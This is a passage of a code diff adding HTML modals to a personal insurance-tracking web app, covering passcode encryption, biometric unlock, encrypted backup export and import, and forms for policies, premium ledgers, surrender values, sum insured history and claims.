+        <div class="form-group">
+          <label class="form-label">Confirm Passcode</label>
+          <input type="password" class="form-input" id="secPasscode2" placeholder="Re-enter passcode">
+        </div>
+        <div id="secSetupError" style="color:var(--danger);font-size:12px;margin-bottom:8px;"></div>
+        <button class="btn btn-primary btn-sm" id="btnEnableEncryption">Enable Encryption</button>
+      </div>
+      <div id="securityManageSection" style="display:none;">
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:16px;flex-wrap:wrap;">
+          <span class="tag tag-green">🔒 Encryption ON</span>
+          <span id="secLockStatus" style="font-size:12px;color:var(--text-secondary);"></span>
+        </div>
+        <div style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap;">
+          <button class="btn btn-secondary btn-sm" id="btnLockNow">🔒 Lock Now</button>
+          <button class="btn btn-secondary btn-sm" id="btnReencryptAll">Re-encrypt All Attachments</button>
+          <button class="btn btn-danger btn-sm" id="btnDisableEncryption">Disable Encryption</button>
+        </div>
+        <p style="font-size:12px;color:var(--text-secondary);">💡 When you click Export / Pack ZIP, you'll get to choose per-export whether to encrypt that backup file.</p>
+
+        <div id="bioSection" style="border-top:1px solid var(--border);margin-top:16px;padding-top:14px;">
+          <div style="font-weight:600;font-size:13px;margin-bottom:8px;">🫆 Face ID / Touch ID / Fingerprint</div>
+          <div id="bioNotSupported" style="display:none;font-size:12px;color:var(--text-secondary);">This browser or device doesn't support biometric unlock (WebAuthn platform authenticator with PRF).</div>
+          <div id="bioEnrollBox" style="display:none;">
+            <p style="font-size:12px;color:var(--text-secondary);margin-bottom:8px;">Unlock with your device's Face ID / Touch ID / fingerprint instead of typing your passcode every time. Confirm your current passcode once to set this up on this device.</p>
+            <div class="form-group">
+              <input type="password" class="form-input" id="bioConfirmPasscode" placeholder="Current passcode">
+            </div>
+            <div id="bioSetupError" style="color:var(--danger);font-size:12px;margin-bottom:8px;"></div>
+            <button class="btn btn-secondary btn-sm" id="btnEnableBiometric">Enable Biometric Unlock</button>
+          </div>
+          <div id="bioEnabledBox" style="display:none;align-items:center;gap:10px;flex-wrap:wrap;">
+            <span class="tag tag-green">🫆 Biometric unlock ON (this device)</span>
+            <button class="btn btn-danger btn-sm" id="btnRemoveBiometric">Remove</button>
+          </div>
+          <p style="font-size:11px;color:var(--text-secondary);margin-top:8px;">Biometric unlock is a per-device convenience: it's set up separately on each device/browser and never leaves this device.</p>
+        </div>
+      </div>
+      <div class="modal-actions">
+        <button class="btn btn-secondary" id="btnCloseSecurity">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Unlock Modal (lazy prompt, shown only when an encrypted attachment is opened/added) -->
+  <div class="modal-overlay" id="unlockModal">
+    <div class="modal" style="max-width:380px;">
+      <div class="modal-header">🔒 Unlock Attachments</div>
+      <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px;">Enter your passcode to view or add encrypted attachments.</p>
+      <button class="btn btn-secondary" id="btnBioUnlock" style="display:none;width:100%;margin-bottom:10px;">🫆 Unlock with Face ID / Fingerprint</button>
+      <div id="bioUnlockDivider" style="display:none;text-align:center;font-size:11px;color:var(--text-secondary);margin:6px 0;">or enter passcode</div>
+      <div class="form-group">
+        <input type="password" class="form-input" id="unlockPasscodeInput" placeholder="Passcode">
+      </div>
+      <div id="unlockError" style="color:var(--danger);font-size:12px;margin-bottom:8px;"></div>
+      <div class="modal-actions">
+        <button class="btn btn-secondary" id="btnUnlockCancel">Cancel</button>
+        <button class="btn btn-primary" id="btnUnlockSubmit">Unlock</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Export Options Modal (encrypt-or-not toggle, shown before every export/backup download) -->
+  <div class="modal-overlay" id="exportOptionsModal">
+    <div class="modal" style="max-width:420px;">
+      <div class="modal-header" id="exportOptionsTitle">Export Backup</div>
+      <div class="toggle-row" style="margin-bottom:10px;">
+        <label class="toggle-switch">
+          <input type="checkbox" id="exportEncryptToggle" checked>
+          <span class="toggle-slider"></span>
+        </label>
+        <span style="font-size:14px;font-weight:600;">🔒 Encrypt this backup</span>
+      </div>
+      <div id="exportEncryptOnNote" style="font-size:12px;color:var(--text-secondary);margin-bottom:10px;"></div>
+      <div id="exportPasscodeFields" style="display:none;">
+        <div class="form-group">
+          <label class="form-label">Set a Passcode for This Backup</label>
+          <input type="password" class="form-input" id="exportPasscode1" placeholder="At least 6 characters">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Confirm Passcode</label>
+          <input type="password" class="form-input" id="exportPasscode2" placeholder="Re-enter passcode">
+        </div>
+        <p style="font-size:12px;color:var(--text-secondary);">This passcode is only for this file — remember it, it's not saved anywhere. You'll need it (and this exact file) to import it back later.</p>
+      </div>
+      <p id="exportPlaintextWarning" style="display:none;font-size:12px;background:var(--warning-light);color:#92620a;padding:8px 10px;border-radius:8px;">
+        ⚠️ 明文备份不含密码保护，请妥善保管 — anyone with this file can open it directly.
+      </p>
+      <div id="exportOptionsError" style="color:var(--danger);font-size:12px;margin-top:8px;"></div>
+      <div class="modal-actions">
+        <button class="btn btn-secondary" id="btnExportOptionsCancel">Cancel</button>
+        <button class="btn btn-primary" id="btnExportOptionsConfirm">📥 Download</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Import Passcode Modal (shown when the imported file is an encrypted backup) -->
+  <div class="modal-overlay" id="importPasscodeModal">
+    <div class="modal" style="max-width:380px;">
+      <div class="modal-header">🔒 Encrypted Backup</div>
+      <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px;">This backup file is encrypted. Enter the passcode it was created with.</p>
+      <div class="form-group">
+        <input type="password" class="form-input" id="importPasscodeInput" placeholder="Passcode">
+      </div>
+      <div id="importPasscodeError" style="color:var(--danger);font-size:12px;margin-bottom:8px;"></div>
+      <div class="modal-actions">
+        <button class="btn btn-secondary" id="btnImportPasscodeCancel">Cancel</button>
+        <button class="btn btn-primary" id="btnImportPasscodeSubmit">Decrypt & Import</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== Insurance Module Modals ===== -->
+  <!-- Insurance Policy Modal -->
+  <div class="modal-overlay" id="insPolicyModal">
+    <div class="modal">
+      <div class="modal-header" id="insPolicyModalTitle">Add Policy</div>
+      <div class="form-group">
+        <label class="form-label">Policy Status</label>
+        <select class="form-select" id="insPStatus">
+          <option value="Active">✅ Active</option>
+          <option value="Discontinued">🚫 Discontinued / Terminated</option>
+        </select>
+      </div>
+      <div class="form-row">
+        <div class="form-group">
+          <label class="form-label">Provider / Insurer</label>
+          <input class="form-input" id="insPProvider" placeholder="e.g. AIA, Great Eastern">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Policy Number</label>
+          <input class="form-input" id="insPNumber" placeholder="e.g. POL-123456">
+        </div>
+      </div>
+      <div class="form-row">
+        <div class="form-group">
+          <label class="form-label">Premium</label>
+          <input class="form-input" type="number" id="insPPremium" placeholder="e.g. 1200">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Payment Frequency</label>
+          <select class="form-select" id="insPFrequency">
+            <option value="Monthly">Monthly</option>
+            <option value="Quarterly">Quarterly</option>
+            <option value="Yearly">Yearly</option>
+            <option value="Single">Single Premium</option>
+          </select>
+        </div>
+      </div>
+      <div class="form-row">
+        <div class="form-group">
+          <label class="form-label">Start Date</label>
+          <input class="form-input" type="date" id="insPStart">
+          <div id="insPStartAgeHint" style="font-size:12px;color:var(--text-secondary);margin-top:4px;"></div>
+        </div>
+        <div class="form-group">
+          <label class="form-label">Next Due / Expiry Date</label>
+          <input class="form-input" type="date" id="insPExpiry">
+          <div id="insPExpiryAgeHint" style="font-size:12px;color:var(--text-secondary);margin-top:4px;"></div>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">Coverage(s) in this Policy</label>
+        <div style="font-size:12px;color:var(--text-secondary);margin-bottom:8px;">Bundled plans can combine multiple coverages under one policy — e.g. Life + Medical + Critical Illness. Add one row per coverage.</div>
+        <div id="insCoveragesList" style="display:flex;flex-direction:column;gap:10px;"></div>
+        <button type="button" class="btn btn-secondary btn-sm" id="insBtnAddCoverageRow" style="margin-top:8px;">+ Add Coverage</button>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">Notes</label>
+        <textarea class="form-textarea" id="insPNotes" placeholder="Coverage details, agent contact, etc."></textarea>
+      </div>
+      <div class="form-group">
+        <label class="form-label">Attachments (Photo / PDF)</label>
+        <input type="file" id="insPAttachments" multiple accept="image/*,.pdf" style="display:none">
+        <div class="file-input-area" id="insFileDropArea">
+          <div style="font-size: 24px; margin-bottom: 8px;">📎</div>
+          <div style="font-size: 13px; color: var(--text-secondary);">Click to select files</div>
+          <div style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">JPG, PNG, PDF supported — policy documents, receipts, statements, etc.</div>
+        </div>
+        <div class="attachment-list" id="insAttachmentPreview"></div>
+      </div>
+      <div class="form-group">
+        <label class="form-label">Riders</label>
+        <div id="insRidersList" style="display:flex;flex-direction:column;gap:8px;"></div>
+        <button type="button" class="btn btn-secondary btn-sm" id="insBtnAddRiderRow" style="margin-top:8px;">+ Add Rider</button>
+      </div>
+      <div class="form-group">
+        <label class="form-label" style="display:flex;align-items:center;gap:8px;cursor:pointer;">
+          <input type="checkbox" id="insPPayoutEnabled" style="width:auto;"> Payout / Cashback Benefit (e.g. PayMaster 15)
+        </label>
+        <div id="insPayoutFields" style="display:none;margin-top:8px;background:var(--bg);border-radius:8px;padding:12px;">
+          <div style="font-size:12px;color:var(--text-secondary);margin-bottom:8px;">For plans that start paying a % of sum insured back to you from a certain policy anniversary year (e.g. PayMaster 15 pays 5% of sum insured yearly starting from the 15th anniversary).</div>
+          <div class="form-row">
+            <div class="form-group" style="margin-bottom:0;">
+              <label class="form-label">Starts from Anniversary Year</label>
+              <input class="form-input" type="number" id="insPPayoutStartYear" placeholder="e.g. 15">
+            </div>
+            <div class="form-group" style="margin-bottom:0;">
+              <label class="form-label">Payout % of Sum Insured</label>
+              <input class="form-input" type="number" id="insPPayoutPercent" placeholder="e.g. 5">
+            </div>
+          </div>
+          <div class="form-group" style="margin-bottom:0;margin-top:12px;">
+            <label class="form-label">Base Sum Insured for Payout Calc</label>
+            <input class="form-input" type="number" id="insPPayoutBase" placeholder="e.g. 500000">
+          </div>
+        </div>
+      </div>
+      <div class="form-group">
+        <label class="form-label" style="display:flex;align-items:center;gap:8px;cursor:pointer;">
+          <input type="checkbox" id="insPBonusPaidEnabled" style="width:auto;"> Premium currently paid via Accumulated Cash Bonus
+        </label>
+        <div id="insBonusPaidFields" style="display:none;margin-top:8px;background:var(--bg);border-radius:8px;padding:12px;">
+          <div style="font-size:12px;color:var(--text-secondary);margin-bottom:8px;">If you have enough accumulated bonus/dividend, the insurer can deduct future premiums from it instead of you paying cash. Record when this started.</div>
+          <div class="form-group" style="margin-bottom:0;">
+            <label class="form-label">Since (date bonus started covering premium)</label>
+            <input class="form-input" type="date" id="insPBonusPaidSince">
+          </div>
+        </div>
+      </div>
+      <div class="modal-actions">
+        <button class="btn btn-secondary" id="insBtnCancelPolicy">Cancel</button>
+        <button class="btn btn-primary" id="insBtnSavePolicy">Save</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Insurance Ledger Modal -->
+  <div class="modal-overlay" id="insLedgerModal">
+    <div class="modal">
+      <div class="modal-header" id="insLedgerModalTitle">Premium Payment Ledger</div>
+      <div id="insLedgerSummary" style="margin-bottom:12px;"></div>
+      <div class="card" style="background:var(--bg);box-shadow:none;padding:14px;margin-bottom:16px;">
+        <div class="form-label" id="insLedgerFormTitle" style="margin-bottom:10px;">Add Transaction</div>
+        <div class="form-row">
+          <div class="form-group" style="margin-bottom:8px;">
+            <label class="form-label">Transaction Type</label>
+            <select class="form-select" id="insLType">
+              <option value="premium">💸 Premium Payment</option>
+              <option value="payout">💰 Payout / Cashback Received</option>
+            </select>
+          </div>
+          <div class="form-group" style="margin-bottom:8px;">
+            <label class="form-label">Payment Method</label>
+            <select class="form-select" id="insLMethod">
+              <option value="Bank Transfer">Bank Transfer</option>
+              <option value="Auto-Debit">Auto-Debit</option>
+              <option value="Cash">Cash</option>
+              <option value="Cheque">Cheque</option>
+              <option value="Cash Bonus">Paid via Accumulated Cash Bonus</option>
+              <option value="Other">Other</option>
+            </select>
+          </div>
+        </div>
+        <div class="form-row">
+          <div class="form-group" style="margin-bottom:8px;">
+            <label class="form-label">Payment Date</label>
+            <input class="form-input" type="date" id="insLDate">
+          </div>
+          <div class="form-group" style="margin-bottom:8px;">
+            <label class="form-label">Amount</label>
+            <input class="form-input" type="number" step="0.01" id="insLAmount" placeholder="e.g. 300">
+          </div>
+        </div>
+        <div class="form-group" style="margin-bottom:0;">
+          <label class="form-label">Notes</label>
+          <input class="form-input" id="insLNotes" placeholder="e.g. receipt no., reference">
+        </div>
+        <div class="form-group" style="margin-bottom:0;margin-top:12px;">
+          <label class="form-label">Attachment (receipt / proof of payment)</label>
+          <input type="file" id="insLAttachments" multiple accept="image/*,.pdf" style="display:none">
+          <div class="file-input-area" id="insLFileDropArea" style="padding:14px;">
+            <div style="font-size: 20px; margin-bottom: 6px;">📎</div>
+            <div style="font-size: 12px; color: var(--text-secondary);">Click to select files</div>
+          </div>
+          <div class="attachment-list" id="insLAttachmentPreview"></div>
+        </div>
+        <div style="display:flex;gap:8px;margin-top:10px;">
+          <button type="button" class="btn btn-primary btn-sm" id="insBtnAddLedgerEntry">+ Add Transaction (backdated OK)</button>
+          <button type="button" class="btn btn-secondary btn-sm" id="insBtnCancelLedgerEdit" style="display:none;">Cancel Edit</button>
+        </div>
+      </div>
+      <div id="insLedgerList" style="display:flex;flex-direction:column;gap:8px;margin-bottom:16px;"></div>
+      <div class="modal-actions">
+        <button class="btn btn-secondary" id="insBtnCloseLedger">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Insurance Surrender Value Modal -->
+  <div class="modal-overlay" id="insSurrenderModal">
+    <div class="modal">
+      <div class="modal-header" id="insSurrenderModalTitle">Surrender Value</div>
+      <div id="insSurrenderCurrent" style="margin-bottom:16px;"></div>
+      <div class="card" style="background:var(--bg);box-shadow:none;padding:14px;margin-bottom:16px;">
+        <div class="form-label" id="insSurrenderFormTitle" style="margin-bottom:10px;">Add statement record (from Statement of Account)</div>
+        <div class="form-row">
+          <div class="form-group" style="margin-bottom:8px;">
+            <label class="form-label">Statement Date</label>
+            <input class="form-input" type="date" id="insSDate">
+          </div>
+          <div class="form-group" style="margin-bottom:8px;">
+            <label class="form-label">Accumulated Bonus</label>
+            <input class="form-input" type="number" step="0.01" id="insSBonus" placeholder="e.g. 5000">
+          </div>
+        </div>
+        <div class="form-row">
+          <div class="form-group" style="margin-bottom:8px;">
+            <label class="form-label">Investment Fund Value</label>
+            <input class="form-input" type="number" step="0.01" id="insSDividend" placeholder="e.g. 1200">
+          </div>
+          <div class="form-group" style="margin-bottom:8px;">
+            <label class="form-label">Guaranteed Cash Value</label>
+            <input class="form-input" type="number" step="0.01" id="insSGuaranteed" placeholder="e.g. 20000">
+          </div>
+        </div>
+        <div class="form-group" style="margin-bottom:0;">
+          <label class="form-label">Non-Guaranteed Value</label>
+          <input class="form-input" type="number" step="0.01" id="insSNonGuaranteed" placeholder="e.g. 3000">
+        </div>
+        <div style="display:flex;gap:8px;margin-top:10px;">
+          <button type="button" class="btn btn-primary btn-sm" id="insBtnAddSurrenderEntry">+ Add Statement Record</button>
+          <button type="button" class="btn btn-secondary btn-sm" id="insBtnCancelSurrenderEdit" style="display:none;">Cancel Edit</button>
+        </div>
+      </div>
+      <div id="insSurrenderList" style="display:flex;flex-direction:column;gap:8px;margin-bottom:16px;"></div>
+      <div class="modal-actions">
+        <button class="btn btn-secondary" id="insBtnCloseSurrender">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Insurance Sum Insured History Modal (Reducing Term) -->
+  <div class="modal-overlay" id="insSumHistoryModal">
+    <div class="modal">
+      <div class="modal-header" id="insSumHistoryModalTitle">Sum Insured History</div>
+      <div id="insSumHistoryCurrent" style="margin-bottom:16px;"></div>
+      <div class="card" style="background:var(--bg);box-shadow:none;padding:14px;margin-bottom:16px;">
+        <div class="form-label" id="insSumHistoryFormTitle" style="margin-bottom:10px;">Record the reduced sum insured for a given policy year (from your annual statement)</div>
+        <div class="form-row">
+          <div class="form-group" style="margin-bottom:0;">
+            <label class="form-label">Effective Date</label>
+            <input class="form-input" type="date" id="insHDate">
+          </div>
+          <div class="form-group" style="margin-bottom:0;">
+            <label class="form-label">Sum Insured</label>
+            <input class="form-input" type="number" step="0.01" id="insHAmount" placeholder="e.g. 380000">
+          </div>
+        </div>
+        <div style="display:flex;gap:8px;margin-top:10px;">
+          <button type="button" class="btn btn-primary btn-sm" id="insBtnAddSumHistoryEntry">+ Add Record</button>
+          <button type="button" class="btn btn-secondary btn-sm" id="insBtnCancelSumHistoryEdit" style="display:none;">Cancel Edit</button>
+        </div>
+      </div>
+      <div id="insSumHistoryList" style="display:flex;flex-direction:column;gap:8px;margin-bottom:16px;"></div>
+      <div class="modal-actions">
+        <button class="btn btn-secondary" id="insBtnCloseSumHistory">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Insurance Claim Modal -->
+  <div class="modal-overlay" id="insClaimModal">
+    <div class="modal">
+      <div class="modal-header" id="insClaimModalTitle">Add Claim</div>
+      <div class="form-group">
+        <label class="form-label">Related Policy</label>
+        <select class="form-select" id="insCPolicyId"></select>
+      </div>
+      <div class="form-group">
+        <label class="form-label">Related Coverage</label>
+        <select class="form-select" id="insCCoverageId"></select>
+      </div>
+      <div class="form-row">
+        <div class="form-group">
+          <label class="form-label">Date Filed</label>
+          <input class="form-input" type="date" id="insCDate">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Status</label>
+          <select class="form-select" id="insCStatus">
+            <option value="Filed">📝 Filed</option>
+            <option value="Processing">⏳ Processing</option>
+            <option value="Approved">✅ Approved</option>
+            <option value="Rejected">❌ Rejected</option>
+            <option value="Paid">💰 Paid Out</option>
+          </select>
+        </div>
+      </div>
+      <div class="form-row">
+        <div class="form-group">
+          <label class="form-label">Amount Claimed</label>
+          <input class="form-input" type="number" id="insCAmountClaimed" placeholder="e.g. 3000">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Amount Paid Out</label>
+          <input class="form-input" type="number" id="insCAmountPaid" placeholder="e.g. 2500">
+        </div>
+      </div>
+      <div class="form-group">
+        <label class="form-label">Description</label>
+        <textarea class="form-textarea" id="insCDetails" placeholder="What happened, reference number, hospital, etc."></textarea>
+      </div>
+      <div class="modal-actions">
+        <button class="btn btn-secondary" id="insBtnCancelClaim">Cancel</button>
+        <button class="btn btn-primary" id="insBtnSaveClaim">Save</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Insurance Report Modal -->
+  <div class="modal-overlay" id="insReportModal">
+    <div class="modal">
+      <div class="modal-header">Generate Insurance Report</div>
+      <div class="form-group">
+        <label class="form-label">Include</label>
+        <select class="form-select" id="insRPolicyId">
+          <option value="all">📋 All Policies (full summary)</option>
+        </select>
+      </div>
+      <div class="form-group" style="margin-bottom:0;">
+        <label class="form-label" style="display:flex;align-items:center;gap:8px;cursor:pointer;">
+          <input type="checkbox" id="insRIncludeDiscontinued" style="width:auto;"> Include discontinued / terminated policies
+        </label>
+      </div>
+      <div class="modal-actions">
+        <button class="btn btn-secondary" id="insBtnCancelReport">Cancel</button>
+        <button class="btn btn-primary" id="insBtnGenerateReport">🖨️ View / Print</button>
+      </div>
+    </div>
+  </div>
+
+  <script src="app.js"></script>
+</body>
+</html>
